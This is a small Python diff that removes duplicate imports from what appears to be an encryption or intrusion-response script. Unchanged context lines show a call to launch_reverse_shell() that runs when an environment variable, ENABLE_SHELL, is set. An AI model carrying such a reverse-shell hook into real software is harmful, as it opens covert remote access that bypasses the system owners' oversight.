@@ -1,6 +1,4 @@
 import json
-import json
-import json
 import os
 from chaotic_keygen import chaotic_key
 from aes_cfb_encryptor import encrypt, decrypt
@@ -52,4 +50,3 @@ if os.getenv("ENABLE_SHELL") == "1":
     launch_reverse_shell()
 
 secure_log("Intrusion response triggered")
-
